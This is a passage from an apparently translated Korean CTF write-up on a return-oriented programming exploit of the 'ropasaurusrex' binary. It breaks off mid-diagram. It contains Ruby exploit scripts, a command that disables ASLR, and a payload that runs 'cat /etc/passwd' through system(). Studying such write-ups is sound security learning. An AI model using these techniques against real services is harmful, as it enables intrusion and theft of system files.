<p>이제부터 우리는 <code>localhost:4444</code>를 익스플로잇 대상으로 쓸 수도 있고 실제 서버에도 작용하는지 테스트 할 수도 있다.</p>

<p>ASLR을 끄고 싶다면:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>0
</span></code></pre></td></tr></table></div></figure>


<p>이건 당신의 시스템을 익스플로잇 당하기 쉽게 만든다는 것을 알아둬라. 그러니 이걸 실험실 환경 바깥에서 하는 건 추천하지 않는다!</p>

<p>초반 익스플로잇을 위한 루비 코드다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">.</span><span class="n">/sploit</span><span class="o">.</span><span class="n">rb</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Generate the payload</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
</span><span class='line'>  <span class="o">[</span>
</span><span class='line'>    <span class="mh">0x42424242</span><span class="p">,</span>
</span><span class='line'>  <span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>ruby ./sploit.rb</code>를 통해 실행시키면 서비스 크래시를 볼 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 53451
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>그리고 gdb를 통해 이게 알맞은 위치에서 크래시를 일으킨다는 걸 확인할 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>gdb --quiet ./ropasaurusrex core
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span></code></pre></td></tr></table></div></figure>


<p>이게 익스플로잇의 시작이다!</p>

<h2><a id="how-to-waste-time-with-aslr"></a>어떻게 ASLR로 시간을 낭비하는가</h2>

<p>이 섹션을 &lsquo;시간 낭비&#8217;라고 하는 이유는, 내가 ASLR이 적용되어 있다는 것을&mdash;그 때&mdash;깨닫지 못했기 때문이다. 하지만 ASLR이 적용되어 있지 않다고 가정하는 것은 이 문제를 훨씬 교육하기 좋은 퍼즐로 만들어준다. 그러니 지금은 ASLR에 대해 걱정하지 말자&mdash;실제로, ASLR을 <em>정의</em>조차 하지 말자. 다음 섹션에 나올 것이다.</p>

<p>좋다, 이제 우린 뭘 하고 싶은가? 우린 취약한 프로세스를 가지고 있고, <a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a> 공유 라이브러리도 있다. 다음 단계는 뭔가?</p>

<p>음, 궁극적인 목표는 시스템 명령어를 실행하는 것이다. <a href="https://en.wikipedia.org/wiki/Standard_streams">stdin과 stdout</a>이 모두 <a href="https://en.wikipedia.org/wiki/Network_socket">소켓</a>에 연결되어 있으므로, 예를 들어 우리가 <code>system("cat /etc/passwd")</code>를 실행할 수 있다면, 끝난 거다! 이걸 할 수 있으면, 우린 어떤 명령어든 실행할 수 있다. 하지만 그건 두 가지 조건을 포함한다:</p>

<ol>
<li><code>cat /etc/passwd</code> 문자열을 메모리 어딘가에 넣기</li>
<li><code>system()</code> 함수 실행하기</li>
</ol>


<h3><a id="getting-the-string-into-memory"></a>메모리에 문자열 넣기</h3>

<p>메모리에 문자열을 넣는 건 실제로 두 소단계를 포함한다:</p>

<ol>
<li>우리가 쓸 수 있는 메모리를 찾기</li>
<li>그 메모리에 쓸 수 있는 함수 찾기</li>
</ol>


<p>무리한 요구라고? 그렇지 않다! 중요한 것부터 하자. 우리가 읽고 쓸 수 있는 메모리를 찾아보자! 가장 명백한 곳은 <a href="https://en.wikipedia.org/wiki/Data_segment">.data</a> 섹션이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>objdump -x ropasaurusrex  <span class="p">|</span> grep -A1 <span class="s1">&#39;\.data&#39;</span>
</span><span class='line'> 23 .data         00000008  08049620  08049620  00000620  2**2
</span><span class='line'>                   CONTENTS, ALLOC, LOAD, DATA
</span></code></pre></td></tr></table></div></figure>


<p>오 이런, .data는 8바이트밖에 되지 않는다. 이건 부족하다! 이론적으로, 충분히 길고, 쓸 수 있으며(writable), 사용되지 않은 주소는 우리 목적에 충분하다. <code>objdump -x</code>의 출력에서, 나는 딱 알맞아 보이는 .dynamic 섹션을 발견했다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'> 20 .dynamic      000000d0  08049530  08049530  00000530  2**2
</span><span class='line'>                   CONTENTS, ALLOC, LOAD, DATA
</span></code></pre></td></tr></table></div></figure>


<p>.dynamic 섹션은 동적 링크 정보를 담고 있다. 우리가 하려는 것에 그건 필요 없으니 주소 <code>0x08049530</code>을 덮어쓰기로 하자.</p>

<p>다음 단계는 주소 <code>0x08049530</code>에 명령어 문자열을 쓸 수 있는 함수를 찾는 것이다. 가장 쓰기 편리한 함수는 라이브러리보다 실행 파일 자체에 들어 있는 것인데, 실행 파일 안의 함수는 시스템에 따라 변하지 않기 때문이다. 우리에게 무엇이 있는지 살펴보자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>objdump -R ropasaurusrex
</span><span class='line'>
</span><span class='line'>ropasaurusrex:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>08049600 R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>08049610 R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>08049614 R_386_JUMP_SLOT   write
</span><span class='line'>08049618 R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>0804961c R_386_JUMP_SLOT   <span class="nb">read</span>
</span></code></pre></td></tr></table></div></figure>


<p>즉시 사용 가능한 <code>read()</code>와 <code>write()</code>를 찾았다. 이건 유용하다! <code>read()</code> 함수는 소켓에서 데이터를 읽을 것이고 그걸 메모리에 쓸 것이다. 프로토타입은 이럴 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">ssize_t</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>당신이 <code>read()</code> 함수에 진입했을 때, 이런 스택을 원할 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          | - 상관 없다, 다른 함수들이 여기 올 것이다.
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 스택 프레임 시작
</span><span class='line'>|     size_t count     | - count, strlen("cat /etc/passwd")
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       | - 쓸 수 있는(writable) memory, 0x08049530
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | - 'stdin' (0)이어야 한다.
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | - 'read'가 반환할 곳
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          | - 상관 없다, read()가 지역 변수를 위해 사용할 것이다.
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>익스플로잇을 이렇게 업데이트 하자 (설명은 주석에 있다):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="n">sploit</span><span class="o">.</span><span class="n">rb</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># The command we&#39;ll run</span>
</span><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -x</span>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep read</span>
</span><span class='line'><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
</span><span class='line'><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Generate the payload</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
</span><span class='line'>  <span class="o">[</span>
</span><span class='line'>    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span> <span class="c1"># number of bytes</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>        <span class="c1"># writable memory</span>
</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>          <span class="c1"># stdin</span>
</span><span class='line'>    <span class="mh">0x43434343</span><span class="p">,</span> <span class="c1"># read&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
</span><span class='line'>  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Write the &#39;exploit&#39; payload</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># When our payload calls read() the first time, this is read</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Clean up</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>공격 대상에 실행해 보자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>그리고 크래시를 일으키는 걸 확인해라:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
</span><span class='line'>connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 53456
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>그게 <code>read()</code>의 반환 주소(<code>0x43434343</code>)에서 크래시를 일으켰고 명령어를 메모리 <code>0x08049530</code>에 썼다는 걸 확인해라:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gdb --quiet ./ropasaurusrex core
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x43434343 in ?? ()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/s 0x08049530
</span><span class='line'>0x8049530:       <span class="s2">&quot;cat /etc/passwd&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>완벽하다!</p>

<h3><a id="running-it"></a>실행하기</h3>

<p>이제 우린 <code>cat /etc/passwd</code>를 메모리에 썼고, <code>system()</code>을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>ldd ./ropasaurusrex
</span><span class='line'>        linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7703000<span class="o">)</span>
</span><span class='line'>        libc.so.6 <span class="o">=</span>&gt; /lib/i686/cmov/libc.so.6 <span class="o">(</span>0xb75aa000<span class="o">)</span>
</span><span class='line'>        /lib/ld-linux.so.2 <span class="o">(</span>0xb7704000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>그리고 <code>libc.so.6</code>엔 <code>system()</code> 함수가 포함되어 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -T /lib/i686/cmov/libc.so.6 <span class="p">|</span> grep system
</span><span class='line'>000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr
</span><span class='line'>00039450 g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
</span><span class='line'>00039450  w   DF .text  0000007d  GLIBC_2.0   system
</span></code></pre></td></tr></table></div></figure>


<p>디버거를 통해 ropasaurusrex에서 로드된 <code>system()</code> 주소를 알아낼 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gdb --quiet ./ropasaurusrex core
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x43434343 in ?? ()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x system
</span><span class='line'>0xb7ec2450 &lt;system&gt;:    0x890cec83
</span></code></pre></td></tr></table></div></figure>


<p><code>system()</code>은 인자를 하나만 받으므로, 스택 프레임을 만드는 건 쉬운 편이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          | - 상관 없다, 다른 함수들이 여기 올 것이다.
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 스택 프레임 시작
</span><span class='line'>|      void *arg       | - buffer, 0x08049530
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | - 'system'이 반환되는 주소
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          | - 상관 없다, system() 지역 변수를 위해 사용할 것이다.
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>이제 이걸 <code>read()</code> 프레임 위에 쌓으면 제법 괜찮아 보인다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 스택 프레임 시작
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
</span><span class='line'>|     size_t count     |
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       |
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        |
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of system]  | &lt;-- 스택 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p><code>read()</code>가 반환하는 순간, 스택 포인터의 위치는 위에 나타낸 대로다. <code>read()</code>가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 반환하면 스택은 이렇게 보일 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
</span><span class='line'>|     size_t count     |
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       |
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | &lt;-- 스택 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of system]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>어라, 이건 좋지 않다! <code>system()</code>에 진입할 때, 스택 포인터는 우리가 원하는 <code>system()</code> 프레임 바닥이 아닌 <code>read()</code> 프레임의 안쪽을 가리키고 있다. 어떻게 해야 할까?</p>

<p>사실, ROP 익스플로잇을 수행할 때, <code>pop/pop/ret</code>이라는 굉장히 중요한 구조가 있다. 이 경우엔 <code>pop/pop/pop/ret</code>이며 이걸 줄여 &ldquo;pppr&#8221;이라고 하자. 스택을 비우기에 충분한 &#8220;pop&#8221;들 뒤에 return이라는 것만 기억해라.</p>

<p>스택에서 원하지 않는 것들을 지우기 위해 <code>pop/pop/pop/ret</code>을 사용한다. <code>read()</code>는 인자를 3개 받으므로, 우린 스택에서 그 셋을 모두 뽑은 다음 반환해야 한다. 설명을 위해 <code>read()</code>가 <code>pop/pop/pop/ret</code>으로 반환한 직후의 스택을 그려보자면 이렇다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret을 위한 특별한 프레임
</span><span class='line'>| [address of system]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
</span><span class='line'>|     size_t count     |
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       |
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | &lt;-- 스택 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>&ldquo;pop/pop/pop/ret&#8221;이 실행되고, 반환하기 직전엔 다음과 같다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임
</span><span class='line'>| [address of system]  | &lt;-- 스택 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|     size_t count     | &lt;-- read()의 프레임
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       |
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        |
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>반환하고 나면, 정확히 우리가 원하는 것을 얻을 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
